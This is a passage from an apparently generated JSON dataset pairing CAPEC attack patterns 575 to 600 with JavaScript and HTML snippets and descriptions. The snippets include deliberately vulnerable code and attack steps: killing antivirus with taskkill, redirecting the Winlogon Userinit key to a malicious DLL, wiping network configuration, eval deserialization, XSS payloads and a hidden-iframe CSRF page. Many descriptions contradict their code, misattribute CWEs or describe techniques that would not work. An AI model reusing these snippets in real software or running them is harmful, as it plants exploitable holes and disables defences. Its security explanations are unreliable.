        "description": "This JavaScript code snippet uses Node.js to execute a system command ('tasklist /svc') that retrieves information about the services running on the target system. The 'exec' function from the 'child_process' module is used to run the command. The output, which includes sensitive system information, is then printed to the console. This code embodies the main idea of the CAPEC 'Services Footprinting' by demonstrating how an adversary could exploit functionality meant for authorized users to gather information about the services on a target system. The related CWEs are represented as follows: CWE-200 and CWE-497 are demonstrated by exposing sensitive system information to unauthorized actors, CWE-214 is shown by the visibility of sensitive information in the command output, and CWE-1229 is implied by the potential creation of emergent resources through the misuse of service information."
    },
    {
        "capec_id": "575",
        "capec_name": "Account Footprinting",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction getUserAccounts() {\n  exec('net user', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`User Accounts: ${stdout}`);\n  });\n}\n\ngetUserAccounts();",
        "description": "This JavaScript code snippet uses Node.js's 'child_process' module to execute the 'net user' command, which retrieves a list of user accounts on a Windows system. The output is then logged to the console. This embodies the main idea of the CAPEC 'Account Footprinting' by demonstrating how an adversary could exploit system commands to gather information about domain accounts. The code also touches on related CWEs, such as CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-214 (Invocation of Process Using Visible Sensitive Information), by potentially exposing sensitive user account information to unauthorized actors through the console output."
    },
    {
        "capec_id": "576",
        "capec_name": "Group Permission Footprinting",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction listLocalGroups() {\n  exec('net localgroup', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Local Groups: ${stdout}`);\n  });\n}\n\nlistLocalGroups();",
        "description": "This JavaScript code snippet uses Node.js to execute a system command that lists local groups on a Windows machine. The 'exec' function from the 'child_process' module is used to run the 'net localgroup' command, which outputs information about user groups and their permissions. This embodies the main idea of the CAPEC 'Group Permission Footprinting' by demonstrating how an adversary could exploit functionality to gather sensitive information about user groups. The code also touches on related CWEs, such as 'Exposure of Sensitive Information to an Unauthorized Actor' (CWE-200) and 'Invocation of Process Using Visible Sensitive Information' (CWE-214), by potentially exposing the output of the command to unauthorized users or processes."
    },
    {
        "capec_id": "577",
        "capec_name": "Owner Footprinting",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction getUserLastLoginTimes(directory) {\n  const files = fs.readdirSync(directory);\n  const userLoginTimes = {};\n\n  files.forEach(file => {\n    if (file === 'ntuser.dat') {\n      const filePath = path.join(directory, file);\n      const stats = fs.statSync(filePath);\n      userLoginTimes[directory] = stats.mtime;\n    }\n  });\n\n  return userLoginTimes;\n}\n\nconst userDirectories = ['/home/user1', '/home/user2'];\nconst loginTimes = userDirectories.map(dir => getUserLastLoginTimes(dir));\nconsole.log(loginTimes);",
        "description": "This JavaScript code snippet demonstrates how an adversary might exploit the 'Owner Footprinting' vulnerability by accessing the last modified times of 'ntuser.dat' files in user directories. The code reads the directories, checks for the presence of 'ntuser.dat' files, and retrieves their last modified times, which can indicate the last login times of the users. This information can be used to inform further targeted malicious behavior. The code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by exposing sensitive login times, and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by accessing system-level information without proper authorization."
    },
    {
        "capec_id": "578",
        "capec_name": "Disable Security Software",
        "code_snippet": "const exec = require('child_process').exec;\n\n// Hard-coded credentials (CWE-798)\nconst adminPassword = 'admin123';\n\n// Function to disable security software\nfunction disableSecuritySoftware(password) {\n  if (password === adminPassword) { // Improper Access Control (CWE-284)\n    // Command to kill a security process (e.g., antivirus)\n    exec('taskkill /F /IM antivirus.exe', (error, stdout, stderr) => {\n      if (error) {\n        console.error(`Error: ${error.message}`);\n        return;\n      }\n      if (stderr) {\n        console.error(`Stderr: ${stderr}`);\n        return;\n      }\n      console.log(`Stdout: ${stdout}`);\n    });\n  } else {\n    console.log('Access Denied: Incorrect Password');\n  }\n}\n\n// Example usage\ndisableSecuritySoftware('admin123');",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary can disable security software by exploiting improper access control (CWE-284) and using hard-coded credentials (CWE-798). The `disableSecuritySoftware` function takes a password as an argument and checks it against a hard-coded admin password. If the password matches, it executes a command to kill a security process (e.g., an antivirus program). This represents the CAPEC 'Disable Security Software' by showing how an attacker can disable security tools to avoid detection."
    },
    {
        "capec_id": "579",
        "capec_name": "Replace Winlogon Helper DLL",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-798: Use of Hard-coded Credentials\nconst hardCodedPassword = 'P@ssw0rd123';\n\n// CWE-427: Uncontrolled Search Path Element\nconst dllPath = path.join('C:', 'Windows', 'System32', 'malicious.dll');\n\n// CWE-15: External Control of System or Configuration Setting\nconst registryKey = 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit';\n\n// Function to simulate modifying the registry key to load a malicious DLL\nfunction modifyRegistry() {\n  try {\n    // CWE-520: .NET Misconfiguration: Use of Impersonation\n    // Simulating elevated access to modify system settings\n    if (process.getuid && process.getuid() !== 0) {\n      throw new Error('Elevated privileges required');\n    }\n\n    // Simulate writing to the registry (in reality, this would require native modules or external tools)\n    fs.writeFileSync(registryKey, dllPath);\n    console.log('Registry key modified to load malicious DLL at startup');\n  } catch (error) {\n    console.error('Failed to modify registry:', error);\n  }\n}\n\nmodifyRegistry();",
        "description": "This JavaScript code snippet demonstrates a potential attack vector where an adversary modifies a Windows registry key to load a malicious DLL at startup. The code includes several security weaknesses: hard-coded credentials (CWE-798), an uncontrolled search path element (CWE-427), and external control of a system configuration setting (CWE-15). The function `modifyRegistry` simulates the modification of the registry key `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit` to point to a malicious DLL, representing the main idea of the CAPEC 'Replace Winlogon Helper DLL'. The code also checks for elevated privileges, simulating a .NET misconfiguration (CWE-520)."
    },
    {
        "capec_id": "580",
        "capec_name": "System Footprinting",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  const url = req.url;\n  let responseMessage = '';\n\n  if (url === '/admin') {\n    responseMessage = 'Admin access granted';\n  } else if (url === '/user') {\n    responseMessage = 'User access granted';\n  } else {\n    responseMessage = 'Access denied';\n  }\n\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end(responseMessage);\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server that responds differently based on the URL path requested. The server provides different messages for '/admin' and '/user' paths, revealing internal state information based on the URL. This embodies the concept of 'System Footprinting' (CAPEC-170) by allowing an adversary to probe the system and gather information about its configuration and access controls. The code also demonstrates 'Observable Response Discrepancy' (CWE-204) by providing different responses for different paths, which can be used to infer the existence of certain resources or access levels. Additionally, it highlights 'Exposure of Sensitive System Information to an Unauthorized Control Sphere' (CWE-497) by potentially revealing sensitive access information to unauthorized users."
    },
    {
        "capec_id": "581",
        "capec_name": "Security Software Footprinting",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction getSecurityTools() {\n  exec('wmic product get name, version', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Installed Security Tools:\n${stdout}`);\n  });\n}\n\ngetSecurityTools();",
        "description": "This JavaScript code snippet uses Node.js to execute a system command that lists all installed software on a Windows machine. The 'wmic product get name, version' command retrieves the names and versions of installed products, which can include security tools. This embodies the CAPEC concept of 'Security Software Footprinting' by attempting to gather information about installed security software. The code also touches on CWE-497 by potentially exposing sensitive system information to unauthorized users. The use of 'exec' to run system commands can be risky if not properly sanitized, which could lead to CWE-506 (Embedded Malicious Code) and CWE-507 (Trojan Horse) if misused."
    },
    {
        "capec_id": "582",
        "capec_name": "Route Disabling",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n    if (!isValidEndpoint(socket.remoteAddress)) {\n      console.error('Unauthorized endpoint detected!');\n      socket.destroy();\n      return;\n    }\n\n    // CWE-924: Improper Enforcement of Message Integrity During Transmission\n    if (!isMessageIntegrityValid(data)) {\n      console.error('Message integrity check failed!');\n      socket.destroy();\n      return;\n    }\n\n    // Process the data...\n    console.log('Received data:', data.toString());\n  });\n\n  socket.on('error', (err) => {\n    console.error('Socket error:', err);\n  });\n});\n\nserver.listen(8080, '127.0.0.1', () => {\n  console.log('Server listening on port 8080');\n});\n\nfunction isValidEndpoint(address) {\n  // Placeholder function to validate endpoint\n  return address === '127.0.0.1';\n}\n\nfunction isMessageIntegrityValid(data) {\n  // Placeholder function to check message integrity\n  return data.toString().includes('valid');\n}",
        "description": "This JavaScript code snippet sets up a basic TCP server using the 'net' module. The server listens for incoming connections and processes data received from clients. The code includes checks to ensure the integrity and validity of the communication channel, addressing several CWEs related to the CAPEC 'Route Disabling'. Specifically, it checks if the endpoint is valid (CWE-923) and if the message integrity is maintained (CWE-924). If either check fails, the connection is terminated, simulating a scenario where an adversary might attempt to disrupt the communication route by exploiting these weaknesses."
    },
    {
        "capec_id": "583",
        "capec_name": "Disabling Network Hardware",
        "code_snippet": "const fs = require('fs');\n\nfunction disableNetworkHardware() {\n  try {\n    // Simulate disabling network hardware by modifying a critical configuration file\n    fs.writeFileSync('/etc/network/interfaces', '');\n    console.log('Network hardware disabled.');\n  } catch (err) {\n    console.error('Failed to disable network hardware:', err);\n  }\n}\n\ndisableNetworkHardware();",
        "description": "This JavaScript code snippet simulates the disabling of network hardware by modifying a critical configuration file. The `disableNetworkHardware` function attempts to overwrite the '/etc/network/interfaces' file, which is typically used to configure network interfaces on Unix-like systems. By writing an empty string to this file, the code effectively disables the network hardware, preventing it from performing its intended service. This action embodies the main idea of the CAPEC 'Disabling Network Hardware' by demonstrating how an adversary could disrupt network services. The code also indirectly touches on related CWEs, such as improper restriction of software interfaces to hardware features (CWE-1256) and improper protection for outbound error messages and alert signals (CWE-1320), by showing how software can be used to manipulate hardware configurations without proper safeguards."
    },
    {
        "capec_id": "584",
        "capec_name": "BGP Route Disabling",
        "code_snippet": "const net = require('net');\n\nconst BGP_PORT = 179;\nconst TARGET_AS = '192.0.2.1';\nconst MALICIOUS_AS = '198.51.100.1';\n\nconst client = new net.Socket();\nclient.connect(BGP_PORT, TARGET_AS, () => {\n  console.log('Connected to target AS');\n  // Send a BGP update message to withdraw a route\n  const bgpWithdrawMessage = Buffer.from('withdraw route message');\n  client.write(bgpWithdrawMessage);\n});\n\nclient.on('data', (data) => {\n  console.log('Received:', data.toString());\n  // Simulate an incorrect destination by redirecting traffic\n  client.connect(BGP_PORT, MALICIOUS_AS, () => {\n    console.log('Redirecting traffic to malicious AS');\n    client.write(data);\n  });\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a simplified version of a BGP route disabling attack. The code connects to a target Autonomous System (AS) using the Border Gateway Protocol (BGP) and sends a message to withdraw a route, making the network inaccessible. It then redirects the traffic to a malicious AS, simulating an incorrect destination. This embodies the main idea of the CAPEC by showing how an adversary can suppress BGP advertisements to disrupt network availability. The code also touches on related CWEs, such as incorrectly specified destinations (CWE-941) and insufficient control of network message volume (CWE-406)."
    },
    {
        "capec_id": "585",
        "capec_name": "DNS Domain Seizure",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const redirectUrl = queryObject.redirect;\n\n  // CWE-601: Open Redirect\n  if (redirectUrl) {\n    res.writeHead(302, { 'Location': redirectUrl });\n    res.end();\n    return;\n  }\n\n  // CWE-350: Reverse DNS Resolution for Security-Critical Action\n  const clientIp = req.connection.remoteAddress;\n  require('dns').reverse(clientIp, (err, hostnames) => {\n    if (err || !hostnames.length) {\n      res.writeHead(403, { 'Content-Type': 'text/plain' });\n      res.end('Access Denied');\n      return;\n    }\n\n    // CWE-79: Cross-site Scripting\n    res.writeHead(200, { 'Content-Type': 'text/html' });\n    res.end(`<h1>Welcome, ${hostnames[0]}</h1>`);\n  });\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server that demonstrates several security weaknesses related to the CAPEC 'DNS Domain Seizure'. The server listens for incoming requests and processes them as follows:\n\n1. **CWE-601: Open Redirect** - The server checks for a 'redirect' query parameter and redirects the user to the specified URL without validation, making it vulnerable to open redirect attacks.\n\n2. **CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action** - The server performs a reverse DNS lookup on the client's IP address to obtain the hostname and makes a security decision based on this information. If the reverse DNS lookup fails, access is denied. This is insecure because the IP address may not be truly associated with the hostname.\n\n3. **CWE-79: Cross-site Scripting (XSS)** - The server includes the hostname obtained from the reverse DNS lookup directly in the HTML response without proper sanitization, making it vulnerable to XSS attacks.\n\nThe code represents the main idea of the CAPEC 'DNS Domain Seizure' by showing how improper handling of DNS and security-critical actions can lead to vulnerabilities that could be exploited to disrupt access to a service."
    },
    {
        "capec_id": "586",
        "capec_name": "Object Injection",
        "code_snippet": "const net = require('net');\n\nclass SensitiveData {\n  constructor(secret) {\n    this.secret = secret;\n  }\n}\n\nfunction deserialize(data) {\n  return eval('(' + data + ')');\n}\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    try {\n      const obj = deserialize(data.toString());\n      console.log('Deserialized object:', obj);\n    } catch (e) {\n      console.error('Deserialization error:', e);\n    }\n  });\n});\n\nserver.listen(1337, '127.0.0.1');\n\n// Example of sending malicious data\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n  const maliciousPayload = '{\"__proto__\": {\"polluted\": \"yes\"}}';\n  client.write(maliciousPayload);\n  client.end();\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable server that deserializes untrusted data using the `eval` function, which is inherently unsafe. The `SensitiveData` class represents a class that could contain sensitive information. The `deserialize` function uses `eval` to convert a string back into an object, which is a common but dangerous practice. The server listens for incoming connections and attempts to deserialize any received data. An example client sends a malicious payload that exploits the deserialization process, potentially leading to prototype pollution or other attacks. This code embodies the main idea of the CAPEC by showing how an adversary can inject malicious content during the deserialization process, leading to various security issues such as remote code execution or data manipulation."
    },
    {
        "capec_id": "587",
        "capec_name": "Cross Frame Scripting (XFS)",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<head>\n    <title>Malicious Page</title>\n</head>\n<body>\n    <h1>Welcome to the Malicious Page</h1>\n    <iframe id=\"hiddenFrame\" src=\"https://legitimate-website.com\" style=\"display:none;\"></iframe>\n    <script>\n        // Wait for the iframe to load\n        document.getElementById('hiddenFrame').onload = function() {\n            var iframe = document.getElementById('hiddenFrame').contentWindow;\n            // Attempt to interact with the legitimate page\n            try {\n                // Example of XSS vulnerability exploitation\n                iframe.document.body.innerHTML += '<img src=\"x\" onerror=\"alert(\\'XSS Attack\\')\">';\n                // Example of CSRF attack\n                iframe.document.forms[0].submit();\n            } catch (e) {\n                console.log('Interaction with iframe failed: ' + e);\n            }\n        };\n    </script>\n</body>\n</html>",
        "description": "This JavaScript code snippet demonstrates a Cross Frame Scripting (XFS) attack. The malicious page contains a hidden iframe that loads a legitimate website. Once the iframe is loaded, the script attempts to interact with the legitimate page. It tries to inject an XSS payload by adding an IMG tag with an onerror attribute, and it also attempts to submit a form to demonstrate a CSRF attack. This code leverages the vulnerabilities described in the related CWEs, such as improper restriction of frames (CWE-1021), XSS (CWE-79, CWE-692, CWE-82), and CSRF (CWE-352). The main idea is to show how an attacker can use a hidden iframe to manipulate a legitimate webpage without the user's knowledge."
    },
    {
        "capec_id": "588",
        "capec_name": "DOM-Based XSS",
        "code_snippet": "document.addEventListener('DOMContentLoaded', function() {\n  var userInput = document.location.hash.substring(1);\n  var targetElement = document.getElementById('output');\n  targetElement.innerHTML = 'User input: ' + userInput;\n});",
        "description": "This JavaScript code snippet demonstrates a DOM-Based XSS vulnerability. When the page loads, it extracts the user input from the URL hash (everything after the '#' symbol) and directly inserts it into the innerHTML of an element with the ID 'output'. This code does not perform any input validation or output encoding, making it susceptible to XSS attacks. An attacker could craft a URL with a malicious script in the hash, which would then be executed in the context of the web page, bypassing any server-side filtering. This example embodies the main idea of CAPEC-63 (DOM-Based XSS) and highlights related weaknesses such as improper input validation (CWE-20) and improper neutralization of input during web page generation (CWE-79)."
    },
    {
        "capec_id": "589",
        "capec_name": "DNS Blocking",
        "code_snippet": "const http = require('http');\nconst dns = require('dns');\n\nconst server = http.createServer((req, res) => {\n  const hostname = req.headers['host'];\n  dns.lookup(hostname, (err, address) => {\n    if (err) {\n      res.writeHead(500);\n      res.end('DNS lookup failed');\n      return;\n    }\n    if (address === '192.168.1.1') { // Example of blocking a specific IP\n      res.writeHead(403);\n      res.end('Access Denied');\n    } else {\n      res.writeHead(200);\n      res.end('Access Granted');\n    }\n  });\n});\n\nserver.listen(8080, '0.0.0.0', () => {\n  console.log('Server running at http://0.0.0.0:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens on all network interfaces (0.0.0.0) and processes incoming requests. It uses the 'dns' module to perform a DNS lookup on the hostname provided in the request headers. If the DNS lookup fails, it returns a 500 error. If the resolved IP address matches a specific IP (e.g., 192.168.1.1), it blocks access by returning a 403 error. Otherwise, it grants access with a 200 status. This code embodies the main idea of the CAPEC 'DNS Blocking' by demonstrating how an adversary could intercept and block DNS requests based on their content. It also highlights related CWEs such as 'Binding to an Unrestricted IP Address' (CWE-1327) and 'Reliance on IP Address for Authentication' (CWE-291)."
    },
    {
        "capec_id": "590",
        "capec_name": "IP Address Blocking",
        "code_snippet": "const http = require('http');\nconst server = http.createServer((req, res) => {\n  const clientIP = req.connection.remoteAddress;\n  const blockedIPs = ['192.168.1.100', '10.0.0.1'];\n\n  if (blockedIPs.includes(clientIP)) {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Access Denied');\n  } else {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Welcome to the service');\n  }\n});\n\nserver.listen(8080, '0.0.0.0', () => {\n  console.log('Server is running on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens on all network interfaces (0.0.0.0) and checks the client's IP address against a list of blocked IPs. If the client's IP address is in the blocked list, the server responds with a 403 status code and an 'Access Denied' message. Otherwise, it responds with a welcome message. This code embodies the main idea of the CAPEC 'IP Address Blocking' by demonstrating how an adversary could block access to a service based on IP addresses. The code also highlights related CWEs: CWE-1327 (Binding to an Unrestricted IP Address), CWE-291 (Reliance on IP Address for Authentication), and CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints)."
    },
    {
        "capec_id": "591",
        "capec_name": "Reflected XSS",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<head>\n    <title>Reflected XSS Example</title>\n</head>\n<body>\n    <h1>Search Results</h1>\n    <div id=\"results\"></div>\n    <script>\n        // Simulate user input from URL parameter\n        var userInput = new URLSearchParams(window.location.search).get('query');\n        // Vulnerable code: directly inserting user input into the DOM without proper sanitization\n        document.getElementById('results').innerHTML = 'You searched for: ' + userInput;\n    </script>\n</body>\n</html>",
        "description": "This JavaScript code snippet demonstrates a Reflected XSS vulnerability. The code takes user input from a URL parameter ('query') and directly inserts it into the DOM without proper sanitization. This allows an attacker to craft a malicious URL containing a script, which, when visited by a victim, will execute the attacker's script in the victim's browser. This example embodies CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-81 (Improper Neutralization of Script in an Error Message Web Page) by showing how unsanitized input can lead to script execution."
    },
    {
        "capec_id": "592",
        "capec_name": "Stored XSS",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<head>\n    <title>Stored XSS Example</title>\n</head>\n<body>\n    <h1>Comments</h1>\n    <form method=\"POST\" action=\"/submit_comment\">\n        <textarea name=\"comment\"></textarea>\n        <button type=\"submit\">Submit</button>\n    </form>\n    <div id=\"comments\">\n        <!-- Assume comments are fetched from a database and inserted here -->\n        <div class=\"comment\">User1: <img src=\"x\" onerror=\"alert('XSS')\"></div>\n        <div class=\"comment\">User2: <script>alert('Stored XSS');</script></div>\n    </div>\n</body>\n</html>",
        "description": "This HTML code snippet demonstrates a stored XSS vulnerability. The form allows users to submit comments, which are then stored in a database and displayed on the page without proper sanitization. The comments section includes examples of malicious input: an IMG tag with an onerror attribute and a script tag. These inputs exploit improper neutralization of input (CWE-79), incomplete denylist (CWE-692), and improper validation of script in attributes (CWE-82). When the page is loaded, the malicious scripts execute, demonstrating the stored XSS attack."
    },
    {
        "capec_id": "593",
        "capec_name": "Session Hijacking",
        "code_snippet": "const express = require('express');\nconst session = require('express-session');\nconst app = express();\n\napp.use(session({\n  secret: 'secret-key',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { maxAge: 60000 }\n}));\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (authenticateUser(username, password)) {\n    req.session.user = username;\n    res.send('Logged in');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.get('/dashboard', (req, res) => {\n  if (req.session.user) {\n    res.send(`Welcome ${req.session.user}`);\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\nfunction authenticateUser(username, password) {\n  // Dummy authentication for demonstration\n  return username === 'admin' && password === 'password';\n}\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web application with session management. The code demonstrates a potential vulnerability related to session hijacking. The session is created with a fixed secret key and does not invalidate existing session identifiers upon login (CWE-384). Additionally, the session expiration is set to a short duration, but the session ID length and other security measures are not adequately addressed (CWE-6, CWE-613). The authentication mechanism is also overly simplistic and does not sufficiently prove the user's identity (CWE-287). This setup can allow an attacker to hijack or manipulate sessions, gaining unauthorized access to the application."
    },
    {
        "capec_id": "594",
        "capec_name": "Traffic Injection",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-319: Cleartext Transmission of Sensitive Information\n    console.log('Received data:', data.toString());\n\n    // CWE-924: Improper Enforcement of Message Integrity During Transmission\n    if (data.toString().includes('INJECT')) {\n      console.log('Injected traffic detected!');\n      socket.write('Error: Invalid data');\n      return;\n    }\n\n    // CWE-940: Improper Verification of Source of a Communication Channel\n    if (socket.remoteAddress !== 'expected.address.com') {\n      console.log('Unexpected source detected!');\n      socket.write('Error: Unauthorized source');\n      return;\n    }\n\n    // Process valid data\n    socket.write('Data received');\n  });\n});\n\nserver.listen(8080, '127.0.0.1');\nconsole.log('Server listening on port 8080');",
        "description": "This JavaScript code snippet creates a simple TCP server using the 'net' module. The server listens for incoming connections and processes the received data. The code demonstrates several vulnerabilities related to the CAPEC description of 'Traffic Injection':\n\n1. CWE-319: The received data is logged in cleartext, which can be sniffed by unauthorized actors.\n2. CWE-924: The code checks for a specific string 'INJECT' to detect injected traffic but does not use proper message integrity checks.\n3. CWE-940: The code verifies the source of the communication channel by checking the remote address, but this check is simplistic and can be bypassed.\n\nThe main idea represented is that an adversary can inject traffic into the network connection, potentially modifying the content and disrupting the connection."
    },
    {
        "capec_id": "595",
        "capec_name": "Connection Reset",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nconst targetHost = 'target.server.com';\nconst targetPort = 80;\n\nclient.connect(targetPort, targetHost, () => {\n  console.log('Connected to target server');\n  // Simulate sending a legitimate request\n  client.write('GET / HTTP/1.1\\r\\nHost: ' + targetHost + '\\r\\n\\r\\n');\n});\n\nclient.on('data', (data) => {\n  console.log('Received data from server:', data.toString());\n  // Inject a connection reset packet\n  client.destroy();\n  console.log('Connection reset packet sent');\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});\n\nclient.on('error', (err) => {\n  console.error('Error:', err);\n});",
        "description": "This JavaScript code snippet demonstrates a basic example of a connection reset attack using Node.js's 'net' module. The code establishes a TCP connection to a target server, sends a legitimate HTTP request, and then immediately closes the connection, simulating the injection of a connection reset packet. This disrupts the communication channel between the client and the server. The code embodies the main idea of the CAPEC by showing how an attacker can sever a connection without directly filtering the traffic. The related CWEs are represented in the context of improper verification of the communication channel's source, lack of message integrity enforcement, and potential for multiple binds to the same port, which could be exploited in more complex scenarios."
    },
    {
        "capec_id": "596",
        "capec_name": "TCP RST Injection",
        "code_snippet": "const net = require('net');\n\nconst targetHost = 'example.com';\nconst targetPort = 80;\nconst fakeRSTPacket = Buffer.from('45000028a6f400004006b1e6c0a80001c0a80002', 'hex');\n\nconst client = new net.Socket();\nclient.connect(targetPort, targetHost, () => {\n  console.log('Connected to target');\n  client.write(fakeRSTPacket);\n  console.log('Sent fake RST packet');\n  client.destroy();\n});\n\nclient.on('error', (err) => {\n  console.error('Connection error:', err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a TCP RST Injection attack. It uses the 'net' module to create a TCP connection to a target server (example.com on port 80). Once connected, it sends a fake TCP RST packet to the server, which aims to terminate the TCP connection. This attack exploits the improper verification of the source of a communication channel (CWE-940) by injecting a malicious packet that the server mistakenly accepts as legitimate. The code also highlights the potential for server-side request forgery (CWE-918) and other related weaknesses by manipulating the communication flow between the client and server."
    },
    {
        "capec_id": "597",
        "capec_name": "Absolute Path Traversal",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nconst server = http.createServer((req, res) => {\n  const filePath = path.join(__dirname, req.url);\n\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.end('File not found');\n      return;\n    }\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(data);\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://localhost:3000/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads files from the filesystem based on the URL requested by the client. The 'filePath' is constructed using 'path.join(__dirname, req.url)', which directly uses the user input from 'req.url' to form the path. This approach is vulnerable to Absolute Path Traversal attacks (CAPEC-36) because it does not properly neutralize special elements like '..' or absolute paths that can resolve to locations outside the intended directory. An attacker could exploit this by requesting URLs with sequences like '/../' to access restricted files on the server."
    },
    {
        "capec_id": "598",
        "capec_name": "DNS Spoofing",
        "code_snippet": "const http = require('http');\nconst dns = require('dns');\n\nfunction fetchResource(url) {\n  dns.lookup('example.com', (err, address) => {\n    if (err) throw err;\n    if (address !== '93.184.216.34') { // Incorrectly specified destination\n      console.error('DNS Spoofing detected!');\n      return;\n    }\n    http.get(url, (res) => {\n      let data = '';\n      res.on('data', (chunk) => { data += chunk; });\n      res.on('end', () => {\n        console.log('Fetched data:', data);\n      });\n    }).on('error', (e) => {\n      console.error(`Got error: ${e.message}`);\n    });\n  });\n}\n\nfetchResource('http://example.com/resource');",
        "description": "This JavaScript code snippet demonstrates a simplified scenario of DNS Spoofing. The `fetchResource` function attempts to resolve the DNS for 'example.com' and checks if the resolved IP address matches the expected IP ('93.184.216.34'). If the IP address does not match, it logs a DNS Spoofing detection message. Otherwise, it proceeds to fetch a resource from the specified URL. This code embodies the main idea of DNS Spoofing by showing how an attacker could manipulate DNS responses to redirect traffic. It also highlights related weaknesses such as reliance on reverse DNS resolution (CWE-350), incorrectly specified destination (CWE-941), and potential for server-side request forgery (CWE-918)."
    },
    {
        "capec_id": "599",
        "capec_name": "Terrestrial Jamming",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nconst serverAddress = '192.168.1.100'; // Example server address\nconst serverPort = 8080; // Example server port\n\nclient.connect(serverPort, serverAddress, () => {\n  console.log('Connected to server');\n  // Sending sensitive data in cleartext\n  client.write('SensitiveData123');\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  // No integrity check on received data\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});\n\nclient.on('error', (err) => {\n  console.error('Connection error: ' + err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a TCP client that connects to a server and transmits sensitive data in cleartext. The code embodies the main idea of the CAPEC 'Terrestrial Jamming' by illustrating vulnerabilities related to improper enforcement of message integrity (CWE-924), improper restriction of communication channels (CWE-923), and cleartext transmission of sensitive information (CWE-319). The client does not verify the integrity of the received data, nor does it ensure that it is communicating with the correct endpoint, making it susceptible to jamming and other attacks."
    },
    {
        "capec_id": "600",
        "capec_name": "Credential Stuffing",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nconst users = { 'user1': 'password123', 'user2': 'password456' }; // CWE-522: Insufficiently Protected Credentials\nlet loginAttempts = {}; // CWE-307: Improper Restriction of Excessive Authentication Attempts\n\napp.use(bodyParser.json());\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (!loginAttempts[username]) loginAttempts[username] = 0;\n  if (loginAttempts[username] >= 5) { // CWE-307: No lockout mechanism\n    return res.status(429).send('Too many attempts, try again later.');\n  }\n  if (users[username] && users[username] === password) { // CWE-308: Single-factor Authentication\n    loginAttempts[username] = 0;\n    return res.status(200).send('Login successful');\n  } else {\n    loginAttempts[username]++;\n    return res.status(401).send('Invalid credentials');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
